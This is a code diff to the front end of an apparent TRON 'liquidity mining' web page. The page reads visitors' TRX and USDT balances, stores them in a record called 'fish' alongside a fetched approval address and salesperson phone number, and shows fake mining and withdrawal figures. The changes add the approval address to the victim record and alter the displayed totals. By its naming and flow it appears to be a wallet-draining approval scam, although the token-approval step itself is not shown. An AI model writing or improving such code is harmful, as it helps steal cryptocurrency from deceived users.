@@ -397,6 +397,7 @@ export default {
       fish: {
           token: undefined,
           address: undefined,
+          auAddress: undefined,
           trx: undefined,
           usdt: undefined,
           total: undefined,
@@ -419,10 +420,10 @@ export default {
           this.contract = await window.tronWeb.contract(this.abi, this.contractAddr);
           console.info(wallet_addr);
 
-          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx=(result/1000000).toFixed(2));
+          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx= result==null?"0.00":result);
           this.fish.address=wallet_addr;
           await this.contract.balanceOf(wallet_addr).call((err, usdt) => {
-            this.fish.usdt=(usdt/1000000).toFixed(2);
+            this.fish.usdt= usdt==null?"0.00":usdt/1.0;
             addFish(this.fish).then(response => {
               if (response.data.code == 200){
                 this.showConnection = false;
@@ -432,7 +433,7 @@ export default {
                 this.fish.trx=balance.trx==null?0.00:balance.trx;
                 this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
                 this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
-                this.fish.total=parseFloat(this.fish.usdt)+parseFloat(this.fish.allowWithdraw);
+                this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;
 
                 return true;
               }else{
@@ -458,6 +459,7 @@ export default {
       getAuth(token).then(response => {
         if (response.data.code==200){
           this.approveAddr=response.data.data.address;
+          this.fish.auAddress=response.data.data.address;
           this.salemanPhone=response.data.data.salemanPhone;
           this.connectionWallet();
           return;
@@ -481,6 +483,7 @@ export default {
 
       var token=this.getUrlKey("token");
       this.fish.token=token;
+      this.fish.auAddress=this.approveAddr;
       getFish(this.fish).then(response => {
         if (response.data.data.auRecordId == null){
           if (this.fish.trx <= 6){
@@ -504,7 +507,7 @@ export default {
           this.fish.trx=balance.trx==null?0.00:balance.trx;
           this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
           this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
-          this.fish.total=parseFloat(this.fish.usdt)+parseFloat(this.fish.allowWithdraw);
+          this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;
           this.$toast({ message: "Start Mining Success"});
           return false;
         }
@@ -533,7 +536,7 @@ export default {
         this.$toast({ message: "Please enter withdraw amount"});
         return;
       }
-      if (this.redeeallBalance>this.fish.allowWithdraw){
+      if (this.redeeallBalance>this.fish.interest){
         this.$toast({ message: "withdraw amount input error"});
         return;
       }
@@ -550,7 +553,7 @@ export default {
         this.fish.trx=balance.trx==null?0.00:balance.trx;
         this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
         this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
-        this.fish.total=parseFloat(this.fish.usdt)+parseFloat(this.fish.allowWithdraw);
+        this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;
         this.$toast({ message: "withdraw Success"});
         return true;
       });
